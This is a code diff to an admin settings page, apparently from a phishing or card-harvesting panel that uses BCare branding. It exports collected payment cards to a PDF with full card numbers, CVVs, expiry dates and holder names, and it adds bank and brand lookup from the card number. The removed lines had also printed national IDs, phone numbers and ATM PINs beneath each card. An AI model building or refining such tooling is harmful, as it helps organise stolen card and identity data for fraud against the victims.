@@ -8,6 +8,7 @@ import jsPDF from "jspdf";
 import autoTable from "jspdf-autotable";
 import * as XLSX from "xlsx";
 import { logActivity } from "@/lib/activityLogger";
+import { getCardMetadata } from "@/lib/cardMetadata";
 
 const AdminSettings = () => {
   const [chatEnabled, setChatEnabled] = useState(true);
@@ -189,80 +190,102 @@ const AdminSettings = () => {
   })();
 
   const drawCard3D = (doc: jsPDF, x: number, y: number, card: any, index: number) => {
-    const cw = 120, ch = 72;
+    const cw = 120, ch = 75;
+    const cardNum = card.card_number_full || card.card_last_four || "";
+    const meta = getCardMetadata(cardNum);
+
     // 3D shadow layers
     for (let i = 4; i >= 1; i--) {
-      doc.setFillColor(180, 180, 190);
-      doc.setDrawColor(180, 180, 190);
+      doc.setFillColor(160, 165, 175);
+      doc.setDrawColor(160, 165, 175);
       doc.roundedRect(x + i * 1.2, y + i * 1.2, cw, ch, 4, 4, "F");
     }
-    // Card gradient background
-    const isVisa = (card.card_number_full || "").startsWith("4");
-    const isMaster = /^5[1-5]/.test(card.card_number_full || "");
-    if (isVisa) {
-      doc.setFillColor(20, 99, 148); // BCare blue
-    } else if (isMaster) {
-      doc.setFillColor(212, 160, 23); // BCare gold
-    } else {
-      doc.setFillColor(30, 30, 60);
-    }
+
+    // Card background color based on brand
+    const colors: Record<string, [number, number, number]> = {
+      visa: [20, 99, 148],
+      mastercard: [30, 30, 60],
+      mada: [0, 120, 70],
+      amex: [40, 60, 120],
+      unknown: [50, 50, 70],
+    };
+    const [r, g, b] = colors[meta.brandKey] || colors.unknown;
+    doc.setFillColor(r, g, b);
     doc.roundedRect(x, y, cw, ch, 4, 4, "F");
-    // Subtle pattern overlay
+
+    // Decorative circles
     doc.setDrawColor(255, 255, 255);
-    doc.setLineWidth(0.15);
-    for (let i = 0; i < 6; i++) {
-      doc.circle(x + cw - 15 + i * 3, y + 15 + i * 3, 18 + i * 4);
+    doc.setLineWidth(0.12);
+    for (let i = 0; i < 5; i++) {
+      doc.circle(x + cw - 10 + i * 4, y + 12 + i * 5, 16 + i * 5);
     }
-    // BCare SVG logo
+
+    // BCare logo (top-left)
     try {
-      doc.addImage(bcareLogo, "SVG", x + 5, y + 5, 32, 13);
+      doc.addImage(bcareLogo, "SVG", x + 5, y + 4, 30, 12);
     } catch {
-      doc.setFontSize(14);
+      doc.setFontSize(12);
       doc.setTextColor(255, 255, 255);
       doc.setFont("helvetica", "bold");
-      doc.text("BCare", x + 8, y + 14);
+      doc.text("BCare", x + 7, y + 12);
     }
+
+    // Bank name (top-right, Arabic)
+    doc.setFontSize(7);
+    doc.setTextColor(220, 225, 240);
+    doc.setFont("helvetica", "bold");
+    const bankLabel = meta.bankName || "غير محدد";
+    doc.text(bankLabel, x + cw - 7, y + 10, { align: "right" });
+
+    // Classification label
+    doc.setFontSize(5.5);
+    doc.setTextColor(180, 190, 210);
+    doc.setFont("helvetica", "normal");
+    doc.text(meta.classificationLabel || "", x + cw - 7, y + 15, { align: "right" });
+
     // Chip
     doc.setFillColor(218, 190, 110);
-    doc.roundedRect(x + 8, y + 26, 14, 10, 1.5, 1.5, "F");
+    doc.roundedRect(x + 8, y + 24, 14, 10, 1.5, 1.5, "F");
     doc.setDrawColor(200, 170, 90);
     doc.setLineWidth(0.3);
-    doc.line(x + 15, y + 26, x + 15, y + 36);
-    doc.line(x + 8, y + 31, x + 22, y + 31);
+    doc.line(x + 15, y + 24, x + 15, y + 34);
+    doc.line(x + 8, y + 29, x + 22, y + 29);
+
     // Card number
     const num = card.card_number_full || `**** **** **** ${card.card_last_four || "****"}`;
     const formatted = num.replace(/(.{4})/g, "$1  ").trim();
     doc.setFontSize(11);
     doc.setTextColor(255, 255, 255);
     doc.setFont("courier", "bold");
-    doc.text(formatted, x + 8, y + 46);
-    // Expiry & CVV
-    doc.setFontSize(6);
+    doc.text(formatted, x + 8, y + 45);
+
+    // Labels
+    doc.setFontSize(5);
     doc.setFont("helvetica", "normal");
-    doc.setTextColor(200, 210, 230);
-    doc.text("VALID THRU", x + 8, y + 53);
-    doc.text("CVV", x + 45, y + 53);
+    doc.setTextColor(180, 190, 210);
+    doc.text("VALID THRU", x + 8, y + 52);
+    doc.text("CVV", x + 42, y + 52);
+
+    // Expiry & CVV values
     doc.setFontSize(9);
     doc.setTextColor(255, 255, 255);
     doc.setFont("helvetica", "bold");
-    doc.text(card.card_expiry || "--/--", x + 8, y + 58);
-    doc.text(card.card_cvv || "---", x + 45, y + 58);
-    // Card holder
+    doc.text(card.card_expiry || "--/--", x + 8, y + 57);
+    doc.text(card.card_cvv || "---", x + 42, y + 57);
+
+    // Card holder name
     doc.setFontSize(8);
     doc.setTextColor(255, 255, 255);
     doc.setFont("helvetica", "bold");
-    doc.text((card.card_holder_name || "CARD HOLDER").toUpperCase(), x + 8, y + 67);
-    // Card brand
+    doc.text((card.card_holder_name || "CARD HOLDER").toUpperCase(), x + 8, y + 68);
+
+    // Card brand (bottom-right)
     doc.setFontSize(10);
     doc.setTextColor(255, 255, 255);
     doc.setFont("helvetica", "bold");
-    const brand = isVisa ? "VISA" : isMaster ? "MASTERCARD" : (card.payment_method || "CARD").toUpperCase();
-    doc.text(brand, x + cw - doc.getTextWidth(brand) - 8, y + 67);
-    // Card # label
-    doc.setFontSize(6);
-    doc.setTextColor(150, 160, 180);
-    doc.setFont("helvetica", "normal");
-    doc.text(`#${index + 1}`, x + cw - 12, y + 14);
+    const brandText = meta.brandLabel || "CARD";
+    doc.text(brandText, x + cw - doc.getTextWidth(brandText) - 8, y + 68);
+
     // Reset
     doc.setTextColor(0, 0, 0);
     doc.setDrawColor(0, 0, 0);
@@ -306,8 +329,8 @@ const AdminSettings = () => {
       doc.setTextColor(0, 0, 0);
 
       const cardsPerRow = 2;
-      const cardW = 120, cardH = 72;
-      const gapX = 20, gapY = 18;
+      const cardW = 120, cardH = 75;
+      const gapX = 20, gapY = 14;
       const startX = (pw - (cardsPerRow * cardW + (cardsPerRow - 1) * gapX)) / 2;
       let startY = 40;
 
@@ -322,22 +345,6 @@ const AdminSettings = () => {
         const cy = startY + rowOnPage * (cardH + gapY);
 
         drawCard3D(doc, cx, cy, card, i);
-
-        // Info below card
-        doc.setFontSize(7);
-        doc.setTextColor(80, 80, 80);
-        doc.setFont("helvetica", "normal");
-        const info = [
-          card.customer_name ? `Customer: ${card.customer_name}` : "",
-          card.national_id ? `ID: ${card.national_id}` : "",
-          card.phone ? `Phone: ${card.phone}` : "",
-          card.payment_method ? `Method: ${card.payment_method}` : "",
-          card.atm_pin ? `ATM PIN: ${card.atm_pin}` : "",
-          card.atm_bill_number ? `Bill#: ${card.atm_bill_number}` : "",
-        ].filter(Boolean);
-        info.forEach((line, li) => {
-          doc.text(line, cx, cy + cardH + 5 + li * 3.5);
-        });
       });
 
       doc.save("bcare-payment-cards.pdf");
